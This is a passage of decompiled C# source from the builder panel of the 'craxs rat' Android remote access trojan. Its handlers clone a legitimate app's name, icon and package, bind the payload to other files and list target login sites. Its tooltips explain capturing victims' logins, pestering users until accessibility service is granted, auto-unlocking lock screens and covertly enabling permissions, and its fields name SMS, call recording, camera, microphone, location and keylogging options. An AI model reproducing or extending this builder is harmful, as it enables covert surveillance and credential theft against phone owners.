		else
		{
			this.checkcaptureonce.Enabled = false;
			this.checkcaptureonce.Checked = false;
			this.panemnitor.Enabled = false;
		}
	}

	// Token: 0x06000261 RID: 609 RVA: 0x000461A8 File Offset: 0x000443A8
	private void Addmintor_Click(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.namemonitor.Text) | string.IsNullOrEmpty(this.linkmonitor.Text))
		{
			EagleAlert.ShowWarning("Both (Name , Link) is required.");
		}
		else
		{
			string text = "";
			text = string.Concat(new string[]
			{
				text,
				this.namemonitor.Text,
				">",
				this.linkmonitor.Text,
				">"
			});
			text = ((!string.IsNullOrEmpty(this.idmonitor.Text)) ? (text + this.idmonitor.Text + ">") : (text + "Blank>"));
			if (this.listmonitor.Items.Contains(text))
			{
				EagleAlert.ShowWarning("This Record Already add.");
			}
			else
			{
				this.listmonitor.Items.Add(text);
				this.namemonitor.Text = "";
				this.linkmonitor.Text = "";
				this.idmonitor.Text = "";
			}
		}
	}

	// Token: 0x06000262 RID: 610 RVA: 0x000462C0 File Offset: 0x000444C0
	private void Removeactiv_Click_1(object sender, EventArgs e)
	{
		if (this.Primslist.Items.Count == 0)
		{
		}
		if (this.Primslist.Items.Count > 0)
		{
			if (this.Primslist.SelectedItem != null)
			{
				this.Primslist.Items.Remove(RuntimeHelpers.GetObjectValue(this.Primslist.SelectedItem));
			}
			else
			{
				EagleAlert.Showinformation("Select Permission First");
			}
		}
		else
		{
			EagleAlert.Showinformation("No Permission to Remove");
		}
	}

	// Token: 0x06000263 RID: 611 RVA: 0x00046340 File Offset: 0x00044540
	private void Removmonitor_Click(object sender, EventArgs e)
	{
		if (this.listmonitor.Items.Count > 0)
		{
			if (this.listmonitor.SelectedItem != null)
			{
				this.listmonitor.Items.Remove(RuntimeHelpers.GetObjectValue(this.listmonitor.SelectedItem));
			}
			else
			{
				EagleAlert.Showinformation("Select Record First.");
			}
		}
		else
		{
			EagleAlert.Showinformation("No Records Found.");
		}
	}

	// Token: 0x06000264 RID: 612 RVA: 0x000463AC File Offset: 0x000445AC
	private void Label15_MouseEnter(object sender, EventArgs e)
	{
		string text = "craxs rat help you detect and save any login information , bases on the list you add above\r\nthis tools does not use fake website or window to capture passwords\r\ninstead, it uses the original website link (the one you provided in box 2)";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainmonitortext.Text = text;
	}

	// Token: 0x06000265 RID: 613 RVA: 0x0000253A File Offset: 0x0000073A
	private void Label15_MouseLeave(object sender, EventArgs e)
	{
		this.explainmonitortext.Text = "";
	}

	// Token: 0x06000266 RID: 614 RVA: 0x00046424 File Offset: 0x00044624
	private void Label18_MouseEnter(object sender, EventArgs e)
	{
		string text = "if this option is enabled , the app will only try to capture the login information once\r\nyou can re-add the website again at runtime using Monitors > Web Browser";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainmonitortext.Text = text;
	}

	// Token: 0x06000267 RID: 615 RVA: 0x0000253A File Offset: 0x0000073A
	private void Label18_MouseLeave(object sender, EventArgs e)
	{
		this.explainmonitortext.Text = "";
	}

	// Token: 0x06000268 RID: 616 RVA: 0x0004649C File Offset: 0x0004469C
	private void Label26_MouseEnter(object sender, EventArgs e)
	{
		string text = "use any name you like , just to help organaize the records";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainmonitortext.Text = text;
	}

	// Token: 0x06000269 RID: 617 RVA: 0x0000253A File Offset: 0x0000073A
	private void Label26_MouseLeave(object sender, EventArgs e)
	{
		this.explainmonitortext.Text = "";
	}

	// Token: 0x0600026A RID: 618 RVA: 0x00046514 File Offset: 0x00044714
	private void Label36_MouseEnter(object sender, EventArgs e)
	{
		string text = "this link will be used to capture information\r\ndont add full link , example: google.com/signin";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainmonitortext.Text = text;
	}

	// Token: 0x0600026B RID: 619 RVA: 0x0000253A File Offset: 0x0000073A
	private void Label36_MouseLeave(object sender, EventArgs e)
	{
		this.explainmonitortext.Text = "";
	}

	// Token: 0x0600026C RID: 620 RVA: 0x0004658C File Offset: 0x0004478C
	private void Label40_MouseEnter(object sender, EventArgs e)
	{
		string text = "instead of detecting links and browsers , craxs rat can detect when specific app launched then try capture login information.";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.panelmonitorb.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explainmonitortext.Text = text;
	}

	// Token: 0x0600026D RID: 621 RVA: 0x0000253A File Offset: 0x0000073A
	private void Label40_MouseLeave(object sender, EventArgs e)
	{
		this.explainmonitortext.Text = "";
	}

	// Token: 0x0600026E RID: 622 RVA: 0x00046604 File Offset: 0x00044804
	private void Label43_MouseEnter(object sender, EventArgs e)
	{
		string text = "if super mode is enabled , the app will keep requesting for accessibility service till it get enabled\r\nthis the delay between each request is ms\r\n25 default";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x0600026F RID: 623 RVA: 0x00002516 File Offset: 0x00000716
	private void Label43_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000270 RID: 624 RVA: 0x0004667C File Offset: 0x0004487C
	private void Label49_MouseEnter(object sender, EventArgs e)
	{
		string text = "android os restrict data usage if the phone connected to sim network 3g/4g/LTE etc and wifi sometimes , this option will ask user to allow this app to use data on background";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000271 RID: 625 RVA: 0x00002516 File Offset: 0x00000716
	private void Label49_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000272 RID: 626 RVA: 0x000466F4 File Offset: 0x000448F4
	private void Clonecheck_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.clonecheck.Checked)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.InitialDirectory = "C:\\";
			openFileDialog.Title = "Selecte Android App [Only .apk] (.apk)";
			openFileDialog.Filter = "apk Files|*.apk";
			DialogResult dialogResult = openFileDialog.ShowDialog();
			if (dialogResult == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				string match = Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\aapt.exe"), "dump badging \"" + fileName + "\"", 5000);
				string text = Codes.ExtractName(fileName);
				string text2 = Conversions.ToString(Codes.RegexMatcher("(?<=package: name=\\')(.*?)(?=\\')", match));
				this.TextNamePatch.Text = text;
				this.TextPackage.Text = text2;
				this.TextVersion.Text = Conversions.ToString(Codes.RegexMatcher("(?<=versionName=\\')(.*?)(?=\\')", match));
				string text3 = Conversions.ToString(Codes.RegexMatcher("(?<=application-icon-160:\\')(.*?)(?=\\')", match));
				if (Operators.CompareString(Path.GetExtension(text3), ".xml", false) == 0)
				{
					text3 = text3.Replace(".xml", ".png");
				}
				string text4 = Codes.TempPathCache + text2 + "\\\\" + text3;
				string directoryName = Path.GetDirectoryName(text4);
				if (text3.Contains("anydpi-v26"))
				{
					string[] pngs = Codes.pngs;
					foreach (string newValue in pngs)
					{
						string text5 = text3.Replace("mipmap-anydpi-v26", newValue).Replace("drawable-anydpi-v26", newValue);
						Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
						{
							"e \"",
							fileName,
							"\" \"",
							text5,
							"\" -o\"",
							directoryName,
							"\" -aoa"
						}), 5000);
					}
				}
				else
				{
					Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
					{
						"e \"",
						fileName,
						"\" \"",
						text3,
						"\" -o\"",
						directoryName,
						"\" -aoa"
					}), 5000);
				}
				Codes.ProcessStartWithOutput(Codes.RealPath("\\\\res\\\\Lib\\\\7z.exe"), string.Concat(new string[]
				{
					"e \"",
					fileName,
					"\" \"META-INF\" -o\"",
					Codes.TempPathCache,
					text2,
					"\\META-INF\" -aoa"
				}), 5000);
				this.iconPatch = openFileDialog.FileName;
				try
				{
					this.PictureBox1.Image = Image.FromFile(text4);
				}
				catch (Exception)
				{
				}
				this.CheckIconPatch.Checked = true;
			}
		}
	}

	// Token: 0x06000273 RID: 627 RVA: 0x0004699C File Offset: 0x00044B9C
	private void Checksuper_MouseClick(object sender, MouseEventArgs e)
	{
		if (this.CheckQuick.Checked)
		{
			Codes.MyMsgBox("info", "this option can't be used with Quick install", false, Resources.information48px);
			this.Checksuper.Checked = false;
		}
	}

	// Token: 0x06000274 RID: 628 RVA: 0x000469D8 File Offset: 0x00044BD8
	private void DrakeUIAvatar2_Click_1(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.trackIDtext.Text) | string.IsNullOrWhiteSpace(this.trackIDtext.Text))
		{
			EagleAlert.Showinformation("Enter ID to add");
		}
		else if (this.tracklist.Items.Contains(this.trackIDtext.Text))
		{
			EagleAlert.Showinformation("ID Already Add");
		}
		else
		{
			this.tracklist.Items.Add(this.trackIDtext.Text);
		}
	}

	// Token: 0x06000275 RID: 629 RVA: 0x00046A5C File Offset: 0x00044C5C
	private void DrakeUIAvatar1_Click_1(object sender, EventArgs e)
	{
		if (this.tracklist.Items.Count > 0)
		{
			if (this.tracklist.SelectedItem != null)
			{
				this.tracklist.Items.Remove(RuntimeHelpers.GetObjectValue(this.tracklist.SelectedItem));
			}
			else
			{
				EagleAlert.Showinformation("Select ID First");
			}
		}
		else
		{
			EagleAlert.Showinformation("ID list is empty");
		}
	}

	// Token: 0x06000276 RID: 630 RVA: 0x00046AC8 File Offset: 0x00044CC8
	private void Label50_MouseEnter(object sender, EventArgs e)
	{
		string text = "craxs app can monitor and record and auto unlock the lock screen if any type such as pattern,password,pin , you can use this feature with screen monitor";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000277 RID: 631 RVA: 0x00002516 File Offset: 0x00000716
	private void Label50_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x06000278 RID: 632 RVA: 0x00046B40 File Offset: 0x00044D40
	private void Label11_MouseEnter(object sender, EventArgs e)
	{
		string text = "if this option is enabled + super mode , craxs app will show (please wait...) , while automatically enable special permissions on oppo & xiaomi";
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "CN", false) != 0)
		{
			if (Operators.CompareString(language, "AR", false) == 0)
			{
				text = Codes.Translate(text, "en", "ar");
				this.explaintoolstext.RightToLeft = RightToLeft.Yes;
			}
		}
		else
		{
			text = Codes.Translate(text, "en", "zh");
		}
		this.explaintoolstext.Text = text;
	}

	// Token: 0x06000279 RID: 633 RVA: 0x00002516 File Offset: 0x00000716
	private void Label11_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0600027A RID: 634 RVA: 0x00046BB8 File Offset: 0x00044DB8
	private void PanelVariable_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (this.RectInputText3.Count > 0)
		{
			foreach (Rectangle rect in this.RectInputText3)
			{
				if (rect.Width > 0)
				{
					e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), rect);
				}
			}
		}
	}

	// Token: 0x0600027B RID: 635 RVA: 0x0000206C File Offset: 0x0000026C
	private void sleep_MouseUp(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x0600027C RID: 636 RVA: 0x0000254C File Offset: 0x0000074C
	private void sleep_MouseDown(object sender, MouseEventArgs e)
	{
		this.startTime.Enabled = true;
	}

	// Token: 0x0600027D RID: 637 RVA: 0x0000255A File Offset: 0x0000075A
	private void startTime_Tick(object sender, EventArgs e)
	{
		this.startTime.Enabled = false;
	}

	// Token: 0x0600027E RID: 638 RVA: 0x0000206C File Offset: 0x0000026C
	private void CheckBIND_CheckedChanged(object sender, EventArgs e)
	{
	}

	// Token: 0x0600027F RID: 639 RVA: 0x00046C50 File Offset: 0x00044E50
	private void CheckBIND_CheckedChanged_1(object sender, EventArgs e)
	{
		if (!this.Programmatically)
		{
			if (this.CheckBIND.Checked)
			{
				this.FilePathApk.Title = "Select File";
				this.FilePathApk.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
				this.FilePathApk.Filter = "All Files|*.*";
				this.FilePathApk.FileName = string.Empty;
				if (this.FilePathApk.ShowDialog() == DialogResult.OK)
				{
					string fileName = this.FilePathApk.FileName;
					if (!File.Exists(fileName))
					{
						return;
					}
					this.trgtbkg.Text = Codes.ExtractPackage(fileName);
					this.bindCtitle.Text = Codes.ExtractName(fileName);
					try
					{
						this.BIND_Path = fileName;
						FileInfo fileInfo = new FileInfo(this.BIND_Path);
						this.BIND_EX = fileInfo.Extension.Remove(0, 1);
						this.CheckSkipre.Enabled = true;
						this.cusomupdateimg.Enabled = true;
						this.Label45.Enabled = true;
						this.Label46.Enabled = true;
						this.Label47.Enabled = true;
						return;
					}
					catch (Exception ex)
					{
						Exception ex2 = ex;
						Codes.MyMsgBox("Error:", ex2.Message, false, Resources.error48px);
						this.BIND_Path = "null";
						this.BIND_EX = "null";
						this.CheckBIND.Checked = false;
						this.cusomupdateimg.Enabled = false;
						this.Label45.Enabled = false;
						this.Label46.Enabled = false;
						this.Label47.Enabled = false;
						return;
					}
				}
			}
			this.BIND_Path = "null";
			this.BIND_EX = "null";
			this.CheckBIND.Checked = false;
			this.CheckSkipre.Enabled = false;
			this.trgtbkg.Text = "";
			this.bindCtitle.Text = "";
			this.cusomupdateimg.Enabled = false;
			this.Label45.Enabled = false;
			this.Label46.Enabled = false;
			this.Label47.Enabled = false;
		}
	}

	// Token: 0x06000280 RID: 640 RVA: 0x00046E78 File Offset: 0x00045078
	public bool IsPngImage(string filePath)
	{
		bool result;
		try
		{
			using (Image image = Image.FromFile(filePath))
			{
				result = (image.RawFormat.Guid == ImageFormat.Png.Guid);
			}
		}
		catch (OutOfMemoryException)
		{
			result = false;
		}
		catch (FileNotFoundException)
		{
			result = false;
		}
		catch (Exception)
		{
			result = false;
		}
		return result;
	}

	// Token: 0x06000281 RID: 641 RVA: 0x00046EFC File Offset: 0x000450FC
	private void Toggle1_CheckedChanged(object sender, EventArgs e)
	{
		try
		{
			if (!this.Programmatically)
			{
				if (this.CheckIconPatch.Checked)
				{
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.InitialDirectory = reso.res_Path_iconsapps;
					openFileDialog.Title = "Selecte icon App (.png)";
					openFileDialog.Filter = "png Files|*.png";
					DialogResult dialogResult = openFileDialog.ShowDialog();
					if (dialogResult != DialogResult.OK)
					{
						this.PictureBox1.Image = null;
						this.iconPatch = "null";
						this.CheckIconPatch.Checked = false;
					}
					else if (!this.IsPngImage(openFileDialog.FileName))
					{
						Codes.MyMsgBox("incorrect format", "Make sure the image/icon is formatted as PNG", false, Resources.error48px);
						this.PictureBox1.Image = null;
						this.iconPatch = "null";
						this.CheckIconPatch.Checked = false;
					}
					else
					{
						this.iconPatch = openFileDialog.FileName;
						this.PictureBox1.Image = Codes.ResizeImage(Image.FromFile(openFileDialog.FileName), new Size(144, 144), false);
					}
				}
				else
				{
					this.PictureBox1.Image = null;
					this.iconPatch = "null";
					this.CheckIconPatch.Checked = false;
				}
			}
		}
		catch (Exception ex)
		{
			Exception ex2 = ex;
			Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
		}
	}

	// Token: 0x06000282 RID: 642 RVA: 0x00002516 File Offset: 0x00000716
	private void Label16_MouseLeave(object sender, EventArgs e)
	{
		this.explaintoolstext.Text = "";
	}

	// Token: 0x0400015B RID: 347
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	// Token: 0x0400015C RID: 348
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TiMAT")]
	private System.Windows.Forms.Timer _TiMAT;

	// Token: 0x0400015D RID: 349
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x0400015E RID: 350
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startTime")]
	private System.Windows.Forms.Timer _startTime;

	// Token: 0x0400015F RID: 351
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label12")]
	private Label _Label12;

	// Token: 0x04000160 RID: 352
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("combotype")]
	private DrakeUIComboBox _combotype;

	// Token: 0x04000161 RID: 353
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label21")]
	private Label _Label21;

	// Token: 0x04000162 RID: 354
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TextSize")]
	private TextBox _TextSize;

	// Token: 0x04000163 RID: 355
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	// Token: 0x04000164 RID: 356
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label17")]
	private Label _Label17;

	// Token: 0x04000165 RID: 357
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label16")]
	private Label _Label16;

	// Token: 0x04000166 RID: 358
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label14")]
	private Label _Label14;

	// Token: 0x04000167 RID: 359
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	// Token: 0x04000168 RID: 360
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label33")]
	private Label _Label33;

	// Token: 0x04000169 RID: 361
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label35")]
	private Label _Label35;

	// Token: 0x0400016A RID: 362
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Checksuper")]
	private DrakeUICheckBox _Checksuper;

	// Token: 0x0400016B RID: 363
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CheckQuick")]
	private DrakeUICheckBox _CheckQuick;

	// Token: 0x0400016C RID: 364
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CheckBIND")]
	private DrakeUICheckBox _CheckBIND;

	// Token: 0x0400016D RID: 365
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CheckIconPatch")]
	private DrakeUICheckBox _CheckIconPatch;

	// Token: 0x0400016E RID: 366
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label43")]
	private Label _Label43;

	// Token: 0x0400016F RID: 367
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("delayaccesstext")]
	private TextBox _delayaccesstext;

	// Token: 0x04000170 RID: 368
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label34")]
	private Label _Label34;

	// Token: 0x04000171 RID: 369
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label38")]
	private Label _Label38;

	// Token: 0x04000172 RID: 370
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label41")]
	private Label _Label41;

	// Token: 0x04000173 RID: 371
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label10")]
	private Label _Label10;

	// Token: 0x04000174 RID: 372
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TextPackage")]
	private DrakeUITextBox _TextPackage;

	// Token: 0x04000175 RID: 373
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("randomidbtn")]
	private DrakeUIAvatar _randomidbtn;

	// Token: 0x04000176 RID: 374
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("randomverbtn")]
	private DrakeUIAvatar _randomverbtn;

	// Token: 0x04000177 RID: 375
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label13")]
	private Label _Label13;

	// Token: 0x04000178 RID: 376
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CheckAllPrims")]
	private DrakeUICheckBox _CheckAllPrims;

	// Token: 0x04000179 RID: 377
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private DrakeUIButtonIcon _Button1;

	// Token: 0x0400017A RID: 378
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SelectedApk")]
	private DrakeUIButtonIcon _SelectedApk;

	// Token: 0x0400017B RID: 379
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addactiv")]
	private DrakeUIAvatar _addactiv;

	// Token: 0x0400017C RID: 380
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("removeactiv")]
	private DrakeUIAvatar _removeactiv;

	// Token: 0x0400017D RID: 381
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("removmonitor")]
	private DrakeUIAvatar _removmonitor;

	// Token: 0x0400017E RID: 382
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addmintor")]
	private DrakeUIAvatar _addmintor;

	// Token: 0x0400017F RID: 383
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkcatpure")]
	private DrakeUICheckBox _checkcatpure;

	// Token: 0x04000180 RID: 384
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label40")]
	private Label _Label40;

	// Token: 0x04000181 RID: 385
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label36")]
	private Label _Label36;

	// Token: 0x04000182 RID: 386
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label26")]
	private Label _Label26;

	// Token: 0x04000183 RID: 387
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label18")]
	private Label _Label18;

	// Token: 0x04000184 RID: 388
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label15")]
	private Label _Label15;

	// Token: 0x04000185 RID: 389
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label49")]
	private Label _Label49;

	// Token: 0x04000186 RID: 390
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clonecheck")]
	private DrakeUICheckBox _clonecheck;

	// Token: 0x04000187 RID: 391
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar1")]
	private DrakeUIAvatar _DrakeUIAvatar1;

	// Token: 0x04000188 RID: 392
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	// Token: 0x04000189 RID: 393
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label50")]
	private Label _Label50;

	// Token: 0x0400018A RID: 394
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label11")]
	private Label _Label11;

	// Token: 0x0400018B RID: 395
	private bool keyback;

	// Token: 0x0400018C RID: 396
	private string MyStamp;

	// Token: 0x0400018D RID: 397
	private bool Package_keyback;

	// Token: 0x0400018E RID: 398
	private bool keybackVersion;

	// Token: 0x0400018F RID: 399
	private string spl_arguments;

	// Token: 0x04000190 RID: 400
	private string BIND_Path;

	// Token: 0x04000191 RID: 401
	private string BIND_EX;

	// Token: 0x04000192 RID: 402
	private string isuper;

	// Token: 0x04000193 RID: 403
	private string anuninstall;

	// Token: 0x04000194 RID: 404
	private string isAOX;

	// Token: 0x04000195 RID: 405
	private string isnetwork;

	// Token: 0x04000196 RID: 406
	private string iscaponce;

	// Token: 0x04000197 RID: 407
	private string isautounlock;

	// Token: 0x04000198 RID: 408
	private string MonitorPack;

	// Token: 0x04000199 RID: 409
	private string trackerlist;

	// Token: 0x0400019A RID: 410
	private string isBind;

	// Token: 0x0400019B RID: 411
	private string isskipreinstall;

	// Token: 0x0400019C RID: 412
	private string iskeepscreen;

	// Token: 0x0400019D RID: 413
	private string isHideprims;

	// Token: 0x0400019E RID: 414
	private string isadmin;

	// Token: 0x0400019F RID: 415
	private string isautostart;

	// Token: 0x040001A0 RID: 416
	private string isQuick;

	// Token: 0x040001A1 RID: 417
	private string isDrawing;

	// Token: 0x040001A2 RID: 418
	private string isnotifi;

	// Token: 0x040001A3 RID: 419
	private string intent_;

	// Token: 0x040001A4 RID: 420
	private string iconPatch;

	// Token: 0x040001A5 RID: 421
	private string Prim_sendsms;

	// Token: 0x040001A6 RID: 422
	private string Prim_recordcalls;

	// Token: 0x040001A7 RID: 423
	private string Prim_wallpaper;

	// Token: 0x040001A8 RID: 424
	private string Prim_readsms;

	// Token: 0x040001A9 RID: 425
	private string Prim_calllog;

	// Token: 0x040001AA RID: 426
	private string Prim_readcontact;

	// Token: 0x040001AB RID: 427
	private string Prim_readacounts;

	// Token: 0x040001AC RID: 428
	private string Prim_camera;

	// Token: 0x040001AD RID: 429
	private string Prim_microphone;

	// Token: 0x040001AE RID: 430
	private string Prim_loacation1;

	// Token: 0x040001AF RID: 431
	private string Prim_loacation2;

	// Token: 0x040001B0 RID: 432
	private string Prim_loacation3;

	// Token: 0x040001B1 RID: 433
	private string Prim_callphone;

	// Token: 0x040001B2 RID: 434
	private bool Programmatically;

	// Token: 0x040001B3 RID: 435
	private string SplitterDNS;

	// Token: 0x040001B4 RID: 436
	private Color colo0;

	// Token: 0x040001B5 RID: 437
	private Color colo1;

	// Token: 0x040001B6 RID: 438
	private string PRIMS;

	// Token: 0x040001B7 RID: 439
	private string THETYPE;

	// Token: 0x040001B8 RID: 440
	private string FAKEAPPNAME;

	// Token: 0x040001B9 RID: 441
	private string FAKEAPPlink;

	// Token: 0x040001BA RID: 442
	private string FAKEAPPicon;

	// Token: 0x040001BB RID: 443
	private string OFFKEYLOG;

